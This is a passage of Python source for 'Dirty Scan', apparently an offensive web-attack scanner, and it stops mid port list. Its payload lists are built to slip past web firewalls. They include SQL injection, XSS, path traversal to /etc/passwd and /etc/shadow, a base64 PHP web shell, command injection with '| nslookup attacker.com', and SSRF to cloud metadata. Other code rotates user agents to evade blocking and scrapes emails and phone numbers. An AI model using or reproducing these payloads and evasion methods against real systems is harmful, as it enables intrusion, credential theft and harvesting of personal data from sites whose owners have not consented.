#!/usr/bin/env python3
"""
============================================================
______ _      _          _____                  
|  _  \(_)    | |        /  ___|                 
| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  
| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ 
| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |
|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|
                    __/ |                        
                   |___/                         
============================================================
  Created by Strozzz
  Version 3.0 | Dirty Scan
============================================================
  Features:
    - WAF Detection (35+ WAF signatures)
    - Automatic WAF Bypass (25+ techniques)
    - 20 Built-in User Agents with Auto-Rotation
    - Automatic Block Detection & UA Switch
    - SQLMap Integration (Auto column count, DB detect)
    - Web Crawling (Links, Forms, JS, Endpoints)
    - Port Scanning (200+ ports, service detection)
    - Vulnerability Scanner (SQLi, XSS, LFI, SSRF, RCE)
    - DNS Enumeration
    - Subdomain Discovery
    - Directory Bruteforce
    - Header Analysis
    - SSL/TLS Check
    - Technology Fingerprinting
    - Backup File Finder
    - Admin Panel Finder
    - CVE Check
    - Report Generation (TXT + JSON)
============================================================
"""

import os
import sys
import re
import json
import time
import random
import socket
import ssl
import hashlib
import base64
import subprocess
import threading
import urllib.parse
import urllib.request
import urllib.error
import http.client
import ipaddress
import shutil
import textwrap
from queue import Queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from collections import defaultdict
from typing import List, Dict, Tuple, Optional, Union, Any

# ============================================================
# REQUIREMENTS AUTO-INSTALL
# ============================================================

REQUIREMENTS = [
    "requests",
    "colorama",
    "beautifulsoup4",
    "lxml",
    "dnspython",
    "urllib3",
    "certifi",
    "cryptography",
    "pyOpenSSL"
]

def auto_install_requirements():
    missing = []
    for pkg in REQUIREMENTS:
        try:
            __import__(pkg.replace("-", "_"))
        except ImportError:
            missing.append(pkg)

    if missing:
        print(f"[*] Installing missing packages: {', '.join(missing)}")
        for pkg in missing:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"[+] {pkg} installed")
            except Exception as e:
                print(f"[-] Failed to install {pkg}: {e}")
        print("[*] All packages installed. Restarting...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

auto_install_requirements()

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""
        LIGHTRED_EX = LIGHTGREEN_EX = LIGHTYELLOW_EX = LIGHTBLUE_EX = LIGHTMAGENTA_EX = LIGHTCYAN_EX = ""
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ""
    class Back:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# ============================================================
# BANNER
# ============================================================

BANNER = """
{R}______ _      _          _____                  
|  _  \(_)    | |        /  ___|                 
| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  
| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ 
| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |
|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|
                    __/ |                        
                   |___/                         
{Y}  [+] Created by: Strozzz           
  [+] Tool Name : Dirty Scan            
  [+] Version   : 3.0                  
{G}  [+] Status   : Ready for scanning...         
{W}
""".format(
    R=Fore.RED, Y=Fore.YELLOW, G=Fore.GREEN, W=Fore.RESET
)


# ============================================================
# 20 USER AGENTS
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

CURRENT_UA_INDEX = 0
WAF_BLOCKED_FLAG = False


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def rotate_user_agent():
    global CURRENT_UA_INDEX
    CURRENT_UA_INDEX = (CURRENT_UA_INDEX + 1) % len(USER_AGENTS)
    return USER_AGENTS[CURRENT_UA_INDEX]


def get_next_user_agent():
    global CURRENT_UA_INDEX
    ua = USER_AGENTS[CURRENT_UA_INDEX]
    CURRENT_UA_INDEX = (CURRENT_UA_INDEX + 1) % len(USER_AGENTS)
    return ua


# ============================================================
# WAF SIGNATURES DATABASE (35+)
# ============================================================

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "__cfuid", "cf-cache-status", "cf-request-id", "cf-edge"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm"],
        "body": ["Attention Required", "Cloudflare Ray ID", "cf-ray", "DDOS protection by Cloudflare"]
    },
    "ModSecurity": {
        "headers": [],
        "server": [],
        "cookies": [],
        "body": ["This error was generated by Mod_Security", "mod_security", "ModSecurity: Access denied", "rules of the mod_security"]
    },
    "AWS WAF": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-amzn-requestid", "x-amzn-ErrorType"],
        "server": ["CloudFront", "AmazonS3"],
        "cookies": ["aws-waf-*"],
        "body": ["Request blocked", "Generated by CloudFront", "AWS WAF"]
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id", "x-akamai-staging"],
        "server": ["Akamai"],
        "cookies": ["aka_*", "akamai"],
        "body": ["Akamai", "Reference #", "AkamaiGHost"]
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-identity", "x-wa-signature", "x-asm-version", "x-asm-policy"],
        "server": ["BigIP", "F5", "BIG-IP"],
        "cookies": ["TS", "F5", "BIGipServer*"],
        "body": ["The request was blocked", "F5 Networks", "ASM", "BIG-IP"]
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo", "x-cdn", "x-visid"],
        "server": ["Incapsula"],
        "cookies": ["incap_ses", "visid_incap", "nlbi", "incap"],
        "body": ["Incapsula", "_incap", "Blocked because of Web Application Firewall", "Incapsula WAF"]
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
        "server": ["Sucuri", "CloudProxy"],
        "cookies": [],
        "body": ["Sucuri WebSite Firewall", "cloudproxy", "Access Denied - Sucuri", "Sucuri"]
    },
    "Barracuda": {
        "headers": ["x-barracuda-*"],
        "server": ["Barracuda"],
        "cookies": ["barra_counter"],
        "body": ["Barracuda", "BLOCKED", "Barracuda WAF"]
    },
    "Fortinet FortiWeb": {
        "headers": ["x-fortitech", "x-fortiweb"],
        "server": ["FortiWeb", "Fortinet"],
        "cookies": ["FORTIWAF"],
        "body": ["Attack detected", "FortiWeb", "Fortinet"]
    },
    "Wordfence": {
        "headers": [],
        "server": [],
        "cookies": ["wfvt_", "wordfence"],
        "body": ["Wordfence", "generated by Wordfence", "blocked by Wordfence", "Wordfence Security"]
    },
    "COMODO WAF": {
        "headers": ["x-cfw-*"],
        "server": ["COMODO"],
        "cookies": ["comodo"],
        "body": ["COMODO", "cWAF", "COMODO WAF"]
    },
    "Radware": {
        "headers": ["x-slb", "x-ratelimit", "x-radware"],
        "server": ["Radware", "AppWall"],
        "cookies": ["radware"],
        "body": ["Radware", "AppWall", "Radware WAF"]
    },
    "StackPath": {
        "headers": ["x-stackpath"],
        "server": ["StackPath"],
        "cookies": [],
        "body": ["StackPath", "StackPath WAF"]
    },
    "Varnish": {
        "headers": ["x-varnish"],
        "server": ["Varnish"],
        "cookies": [],
        "body": ["varnish", "Varnish cache"]
    },
    "NAXSI": {
        "headers": ["x-naxsi-waf"],
        "server": ["naxsi"],
        "cookies": [],
        "body": ["naxsi_block", "NAXSI"]
    },
    "WebKnight": {
        "headers": [],
        "server": ["WebKnight"],
        "cookies": [],
        "body": ["WebKnight", "AQTRONIX", "WebKnight WAF"]
    },
    "Safe3": {
        "headers": ["x-powered-by"],
        "server": ["Safe3WAF", "Safe3"],
        "cookies": ["safe3"],
        "body": ["Safe3"]
    },
    "Profense": {
        "headers": ["x-profense-*"],
        "server": ["Profense"],
        "cookies": [],
        "body": ["Profense"]
    },
    "Palo Alto": {
        "headers": ["x-panorama", "x-pan-*", "x-paloalto"],
        "server": ["PAN", "PaloAlto"],
        "cookies": [],
        "body": ["Palo Alto", "PANW", "GlobalProtect"]
    },
    "Citrix NetScaler": {
        "headers": ["x-ns-*", "x-ns-af-*"],
        "server": ["NetScaler", "Citrix"],
        "cookies": ["citrix", "NSC_*"],
        "body": ["NetScaler", "AppFirewall", "Citrix"]
    },
    "SiteGround": {
        "headers": ["x-sg-*"],
        "server": ["SiteGround"],
        "cookies": [],
        "body": ["SiteGround"]
    },
    "KnownHost": {
        "headers": [],
        "server": ["KnownHost"],
        "cookies": [],
        "body": ["KnownHost"]
    },
    "Qrator": {
        "headers": ["x-qrator-*"],
        "server": ["Qrator"],
        "cookies": [],
        "body": ["Qrator"]
    },
    "Reblaze": {
        "headers": ["x-reblaze-*"],
        "server": ["Reblaze"],
        "cookies": [],
        "body": ["Reblaze"]
    },
    "CrawlProtect": {
        "headers": [],
        "server": ["CrawlProtect"],
        "cookies": [],
        "body": ["CrawlProtect"]
    },
    "LiteSpeed": {
        "headers": [],
        "server": ["LiteSpeed", "LiteSpeedTech", "LiteSpeed"],
        "cookies": [],
        "body": ["LiteSpeed"]
    },
    "BlockDoS": {
        "headers": [],
        "server": ["BlockDoS"],
        "cookies": [],
        "body": ["BlockDoS"]
    },
    "Yundun": {
        "headers": ["x-yundun-*"],
        "server": ["Yundun"],
        "cookies": [],
        "body": ["Yundun"]
    },
    "Aliyun WAF": {
        "headers": ["x-slb-*", "x-cdn-*"],
        "server": ["Aliyun", "Alibaba", "AliyunOSS"],
        "cookies": ["aliyungf"],
        "body": ["Aliyun", "Alibaba Cloud", "cdn-aliyun"]
    },
    "Baidu Yunjiasu": {
        "headers": ["x-bd-*", "yunjiasu"],
        "server": ["yunjiasu", "Baidu"],
        "cookies": [],
        "body": ["yunjiasu", "Baidu"]
    },
    "Safedog": {
        "headers": ["x-powered-by"],
        "server": ["Safedog"],
        "cookies": ["safedog"],
        "body": ["Safedog", "SafeDog"]
    },
    "DDoS-Guard": {
        "headers": ["x-ddos-guard"],
        "server": ["ddos-guard"],
        "cookies": [],
        "body": ["DDoS-Guard"]
    },
    "Kona SiteDefender": {
        "headers": ["x-kona-*", "x-siteshield"],
        "server": ["Akamai"],
        "cookies": ["AKA_*"],
        "body": ["Kona", "SiteDefender"]
    },
    "Microsoft Azure WAF": {
        "headers": ["x-azure-*", "x-ms-*"],
        "server": ["Microsoft-Azure", "Azure"],
        "cookies": ["Azure*"],
        "body": ["Azure Web Application Firewall", "azure"]
    },
    "GCP Cloud Armor": {
        "headers": ["x-cloud-trace", "x-goog-*"],
        "server": ["Google", "GSE"],
        "cookies": [],
        "body": ["Google Cloud Armor", "cloudarmor"]
    },
    "Fastly": {
        "headers": ["x-fastly-*", "x-served-by"],
        "server": ["Fastly"],
        "cookies": ["fastly-*"],
        "body": ["Fastly"]
    },
    "KeyCDN": {
        "headers": ["x-keycdn-*"],
        "server": ["KeyCDN"],
        "cookies": [],
        "body": ["KeyCDN"]
    },
    "CacheFly": {
        "headers": ["x-cachefly-*"],
        "server": ["CacheFly"],
        "cookies": [],
        "body": ["CacheFly"]
    }
}


# ============================================================
# WAF DETECTOR
# ============================================================

class WAFDetector:
    def __init__(self, target_url, timeout=15):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.detected_wafs = []

    def send_request(self, url=None, headers=None):
        if url is None:
            url = self.target_url
        if headers is None:
            headers = {"User-Agent": get_random_user_agent()}

        try:
            r = requests.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            return r
        except Exception:
            return None

    def detect_by_normal_request(self) -> List[Tuple[str, int]]:
        r = self.send_request()
        if r is None:
            return []

        wafs_found = []
        headers = dict(r.headers)
        body = r.text[:8000] if r.text else ""
        cookies = dict(r.cookies)
        server = headers.get("Server", "")

        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0
            max_score = 0

            for h in sigs["headers"]:
                h_lower = h.lower().replace("*", "")
                for resp_h in headers:
                    if h_lower in resp_h.lower():
                        score += 2
                    max_score += 2

            if sigs["server"]:
                for s in sigs["server"]:
                    if s.lower() in server.lower():
                        score += 3
                    max_score += 3

            if sigs["cookies"]:
                for c in sigs["cookies"]:
                    c_lower = c.lower().replace("*", "")
                    for cookie_name in cookies:
                        if c_lower in cookie_name.lower():
                            score += 2
                        max_score += 2

            if sigs["body"]:
                for b in sigs["body"]:
                    if re.search(b, body, re.IGNORECASE):
                        score += 2
                    max_score += 2

            if max_score > 0 and score >= 2:
                confidence = min(100, int((score / max_score) * 100))
                wafs_found.append((waf_name, confidence))

        wafs_found.sort(key=lambda x: x[1], reverse=True)
        return wafs_found

    def detect_by_malicious_request(self) -> Tuple[List[str], bool]:
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1--",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "1 AND 1=1",
            "1' ORDER BY 1--",
            "' WAITFOR DELAY '0:0:5'--",
            "/*!50000 SELECT*/",
            "1'/*!*/",
            "admin'--",
        ]

        wafs_found = []
        blocked_count = 0
        total = 0

        for payload in payloads:
            total += 1
            parsed = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed.query)

            if params:
                test_params = {}
                for k, v in params.items():
                    val = v[0] if isinstance(v, list) else v
                    test_params[k] = val + payload
                test_url = self.target_url.split("?")[0] + "?" + urllib.parse.urlencode(test_params)
            else:
                test_url = self.target_url + "?id=" + urllib.parse.quote(payload)

            headers = {"User-Agent": get_random_user_agent()}
            r = self.send_request(url=test_url, headers=headers)

            if r is None:
                blocked_count += 1
                continue

            if r.status_code in [403, 406, 429, 503, 500]:
                blocked_count += 1
            elif len(r.text) < 100 and r.status_code != 200:
                blocked_count += 1
            elif "blocked" in r.text.lower() or "denied" in r.text.lower() or "captcha" in r.text.lower():
                blocked_count += 1

            body = r.text[:3000] if r.text else ""
            for waf_name in WAF_SIGNATURES:
                sigs = WAF_SIGNATURES[waf_name]
                for b in sigs.get("body", []):
                    if re.search(b, body, re.IGNORECASE):
                        wafs_found.append(waf_name)
                        break
                else:
                    continue
                break

        blocked_ratio = blocked_count / max(total, 1)
        return wafs_found, blocked_ratio > 0.4

    def detect(self) -> Tuple[List[Tuple[str, int]], bool]:
        if not self.target_url:
            return [], False

        normal_wafs = self.detect_by_normal_request()
        malicious_wafs, is_blocked = self.detect_by_malicious_request()

        combined = {}
        for waf_name, conf in normal_wafs:
            combined[waf_name] = conf

        for waf_name in malicious_wafs:
            if waf_name not in combined:
                combined[waf_name] = 60
            else:
                combined[waf_name] = min(100, combined[waf_name] + 20)

        result = sorted(combined.items(), key=lambda x: x[1], reverse=True)
        self.detected_wafs = result
        return result, is_blocked


# ============================================================
# WAF BYPASS ENGINE (25+ Techniques)
# ============================================================

class WAFBypass:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.bypass_payloads = []
        self.tamper_scripts = [
            "space2comment", "between", "randomcase", "charunicodeencode",
            "percentage", "halfversionedmorekeywords", "ifnull2ifisnull",
            "modsecurityversioned", "modsecurityzeroversioned", "charencode",
            "equaltolike", "greatest", "multiplespaces", "numberedcomments",
            "overlongutf8", "unionalltounion", "unmagicquotes", "versionedkeywords",
            "space2dash", "base64encode", "space2plus", "space2tilde",
            "space2randomblank", "bluecoat", "apostrophemask", "apostrophenullencode"
        ]

    def generate_payloads(self, base_sqli="' OR '1'='1", base_xss="<script>alert(1)</script>", base_lfi="../../../etc/passwd"):
        payloads = {
            "sqli": [],
            "xss": [],
            "lfi": [],
            "rce": [],
            "ssrf": [],
            "headers": []
        }

        # SQLi Bypass Payloads (25 techniques)
        payloads["sqli"].append(base_sqli)
        payloads["sqli"].append(urllib.parse.quote(base_sqli))
        payloads["sqli"].append(urllib.parse.quote(urllib.parse.quote(base_sqli)))
        payloads["sqli"].append(base_sqli.lower())
        payloads["sqli"].append(base_sqli.upper())
        payloads["sqli"].append("'/**/OR/**/'1'='1")
        payloads["sqli"].append("'/*!OR*/'1'='1")
        payloads["sqli"].append("' OR 0x313131=0x313131--")
        payloads["sqli"].append("' OR 0x31=0x31--")
        payloads["sqli"].append("%00'" + base_sqli)
        payloads["sqli"].append("'%09OR%0A'1'='1")
        payloads["sqli"].append("\\u0027 OR \\u00271\\u0027=\\u00271")
        payloads["sqli"].append("%u0027 OR %u00271%u0027=%u00271")
        payloads["sqli"].append("&#39; OR &#39;1&#39;=&#39;1")
        payloads["sqli"].append("' OR '1' LIKE '1")
        payloads["sqli"].append("' OR '1' IN ('1')")
        payloads["sqli"].append("' || '1'='1")
        payloads["sqli"].append("' OR 1=1--")
        payloads["sqli"].append("\\' OR '1'='1")
        payloads["sqli"].append("') OR ('1'='1")
        payloads["sqli"].append("') OR 1=1--")
        payloads["sqli"].append("'/**/OR/**/'1'/**/='1")
        payloads["sqli"].append("'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--")
        payloads["sqli"].append("' OR '1'='1'-- ")
        payloads["sqli"].append("' OR '1'='1'#")
        payloads["sqli"].append("' OR '1'='1'/*")
        payloads["sqli"].append("' OR 1e1=1e1--")
        payloads["sqli"].append("' OR !(0)--")
        payloads["sqli"].append("' OR ~(0)--")
        payloads["sqli"].append("' OR 'a'='a")
        payloads["sqli"].append("' OR -1=-1--")
        payloads["sqli"].append("'+OR+1=1--")

        # XSS Bypass Payloads
        payloads["xss"].append("<script>alert(1)</script>")
        payloads["xss"].append("<ScRiPt>alert(1)</ScRiPt>")
        payloads["xss"].append("<img src=x onerror=alert(1)>")
        payloads["xss"].append("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>")
        payloads["xss"].append("\"><script>alert(1)</script>")
        payloads["xss"].append("<svg onload=alert(1)>")
        payloads["xss"].append("<body onload=alert(1)>")
        payloads["xss"].append("\" onfocus=alert(1) autofocus=\"")
        payloads["xss"].append("javascript:alert(1)")
        payloads["xss"].append("<IMG SRC=javascript:alert('XSS')>")
        payloads["xss"].append("%3Cscript%3Ealert(1)%3C/script%3E")
        payloads["xss"].append("<<script>alert(1)></script>")
        payloads["xss"].append("<script>eval(\\x61lert(1))</script>")
        payloads["xss"].append("<script>\\u0061lert(1)</script>")
        payloads["xss"].append("<script src=data:text/javascript,alert(1)>")

        # LFI Payloads
        payloads["lfi"].append("../../../etc/passwd")
        payloads["lfi"].append("../../../../etc/passwd")
        payloads["lfi"].append("../../../../../../etc/passwd")
        payloads["lfi"].append("....//....//....//etc/passwd")
        payloads["lfi"].append("..\\/..\\/..\\/etc/passwd")
        payloads["lfi"].append("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd")
        payloads["lfi"].append("%252e%252e%252f%252e%252e%252fetc/passwd")
        payloads["lfi"].append("../../../etc/passwd%00")
        payloads["lfi"].append("../../../etc/passwd%2500")
        payloads["lfi"].append("../../../etc/shadow")
        payloads["lfi"].append("../../../var/log/apache2/access.log")
        payloads["lfi"].append("php://filter/read=convert.base64-encode/resource=index.php")
        payloads["lfi"].append("php://filter/convert.base64-encode/resource=config.php")
        payloads["lfi"].append("php://input")
        payloads["lfi"].append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+")

        # RCE Payloads
        payloads["rce"].append("; id")
        payloads["rce"].append("| id")
        payloads["rce"].append("` id`")
        payloads["rce"].append("$(id)")
        payloads["rce"].append("; uname -a")
        payloads["rce"].append("| cat /etc/passwd")
        payloads["rce"].append("& whoami &")
        payloads["rce"].append("&& ls -la &&")
        payloads["rce"].append("%3B cat /etc/passwd")
        payloads["rce"].append("| nslookup attacker.com")

        # SSRF Payloads
        payloads["ssrf"].append("http://127.0.0.1:80")
        payloads["ssrf"].append("http://localhost:8080")
        payloads["ssrf"].append("http://[::1]:80")
        payloads["ssrf"].append("http://0.0.0.0:443")
        payloads["ssrf"].append("file:///etc/passwd")
        payloads["ssrf"].append("http://169.254.169.254/latest/meta-data/")

        # Headers for bypass
        payloads["headers"].append({"X-Forwarded-For": "127.0.0.1"})
        payloads["headers"].append({"X-Forwarded-Host": "localhost"})
        payloads["headers"].append({"X-Client-IP": "127.0.0.1"})
        payloads["headers"].append({"X-Remote-IP": "127.0.0.1"})
        payloads["headers"].append({"X-Remote-Addr": "127.0.0.1"})
        payloads["headers"].append({"X-Originating-IP": "127.0.0.1"})
        payloads["headers"].append({"X-Host": "localhost"})
        payloads["headers"].append({"X-Real-IP": "127.0.0.1"})

        self.bypass_payloads = payloads
        return payloads


# ============================================================
# WEB CRAWLER
# ============================================================

class WebCrawler:
    def __init__(self, base_url, max_pages=50, timeout=10):
        self.base_url = base_url.rstrip("/")
        self.max_pages = max_pages
        self.timeout = timeout
        self.visited = set()
        self.urls_found = []
        self.forms_found = []
        self.js_files = []
        self.endpoints = []
        self.comments = []
        self.emails = set()
        self.phone_numbers = set()
        self.api_endpoints = set()
        self.lock = threading.Lock()

    def extract_info(self, html, source_url):
        # Extract emails
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        for match in re.finditer(email_pattern, html):
            self.emails.add(match.group())

        # Extract phone numbers
        phone_pattern = r'\+?[\d\s\-\(\)]{7,15}'
        for match in re.finditer(phone_pattern, html):
            self.phone_numbers.add(match.group().strip())

        # Extract HTML comments
        comment_pattern = r'<!--(.*?)-->'
        for match in re.finditer(comment_pattern, html, re.DOTALL):
            comment = match.group(1).strip()
            if comment and len(comment) > 5:
                self.comments.append({"source": source_url, "comment": comment})

        # Extract API endpoints
        api_pattern = r'(/api/[\w/\-\.]+|/v[0-9]+/[\w/\-\.]+|/graphql|/rest/[\w/\-\.]+)'
        for match in re.finditer(api_pattern, html):
            self.api_endpoints.add(match.group(1))

    def extract_links(self, html, source_url):
        links = []

        if BeautifulSoup:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for a in soup.find_all("a", href=True):
                    href = a["href"].strip()
                    if href and not href.startswith("#") and not href.startswith("javascript"):
                        full_url = urllib.parse.urljoin(source_url, href)
                        if self.base_url.split("//")[1].split("/")[0] in full_url:
                            links.append(full_url)

                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    method = form.get("method", "GET").upper()
                    inputs = []
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        inp_type = inp.get("type", "text")
                        if name:
                            inputs.append({"name": name, "type": inp_type})
                    form_url = urllib.parse.urljoin(source_url, action)
                    self.forms_found.append({
                        "url": form_url,
                        "method": method,
                        "inputs": inputs,
                        "source": source_url
                    })

                for script in soup.find_all("script", src=True):
                    js_url = urllib.parse.urljoin(source_url, script["src"])
                    if js_url not in self.js_files:
                        self.js_files.append(js_url)

                for link in soup.find_all("link", href=True):
                    href = link["href"].strip()
                    full_url = urllib.parse.urljoin(source_url, href)
                    if full_url not in self.urls_found:
                        self.endpoints.append(full_url)

            except Exception:
                pass

        # Regex fallback
        for pattern in [r'href=["\']([^"\']+)["\']', r'src=["\']([^"\']+)["\']', r'action=["\']([^"\']+)["\']']:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                url = match.group(1)
                if url and not url.startswith("#") and not url.startswith("javascript"):
                    full_url = urllib.parse.urljoin(source_url, url)
                    if self.base_url.split("//")[1].split("/")[0] in full_url:
                        links.append(full_url)

        # Extract info from this page
        self.extract_info(html, source_url)

        return list(set(links))

    def crawl_page(self, url):
        if url in self.visited or len(self.visited) >= self.max_pages:
            return []

        with self.lock:
            if url in self.visited:
                return []
            self.visited.add(url)

        try:
            headers = {"User-Agent": get_random_user_agent()}
            r = requests.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            links = self.extract_links(r.text, url)

            with self.lock:
                self.urls_found.append(url)

            return links
        except Exception:
            return []

    def crawl(self):
        to_visit = [self.base_url]

        while to_visit and len(self.visited) < self.max_pages:
            url = to_visit.pop(0)
            new_links = self.crawl_page(url)

            for link in new_links:
                if link not in self.visited and link not in to_visit:
                    parsed = urllib.parse.urlparse(link)
                    path = parsed.path.rstrip("/")
                    ext = os.path.splitext(path)[1].lower()
                    # Skip binary/file downloads
                    if ext in ['.pdf', '.zip', '.tar', '.gz', '.exe', '.msi', '.dmg', '.iso']:
                        continue
                    to_visit.append(link)

        return {
            "urls": self.urls_found,
            "forms": self.forms_found,
            "js_files": self.js_files,
            "endpoints": self.endpoints[:50],
            "emails": list(self.emails),
            "phone_numbers": list(self.phone_numbers),
            "comments": self.comments,
            "api_endpoints": list(self.api_endpoints),
            "total_crawled": len(self.visited)
        }


# ============================================================
# PORT SCANNER (200+ Ports)
# ============================================================

COMMON_PORTS = [
    20, 21, 22, 23, 25, 53, 69, 80, 81, 88, 110, 111, 113, 123, 135, 137, 139, 143,
    161, 162, 179, 389, 443, 444, 445, 465, 500, 502, 512, 513, 514, 515, 520, 521,
    523, 540, 548, 554, 563, 585, 587, 591, 593, 631, 636, 639, 646, 648, 666, 667,
    668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683,
    684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699,
    700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715,
    716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731,
    732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747,
    748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763,
    764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779,
    780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795,
    796, 797, 798, 799, 800, 801, 802, 808, 843, 873, 902, 904, 912, 981, 987, 990,
    992, 993, 994, 995, 999, 1000, 1010, 1025, 1026, 1027, 1028, 1029, 1030, 1080,
    1099, 1100, 1102, 1104, 1105, 1106, 1107, 1108, 1110, 1111, 1112, 1113, 1114,
    1117, 1119, 1121, 1122, 1123, 1124, 1126, 1130, 1131, 1132, 1138, 1141, 1145,
    1148, 1151, 1152, 1154, 1163, 1164, 1165, 1166, 1169, 1174, 1175, 1183, 1185,
    1186, 1187, 1192, 1198, 1199, 1201, 1213, 1216, 1217, 1218, 1233, 1234, 1236,
    1244, 1247, 1248, 1259, 1271, 1272, 1277, 1287, 1296, 1300, 1301, 1309, 1310,
    1311, 1322, 1328, 1334, 1352, 1417, 1418, 1419, 1420, 1421, 1422, 1433, 1434,
    1443, 1455, 1461, 1494, 1500, 1501, 1503, 1521, 1524, 1533, 1556, 1580, 1583,
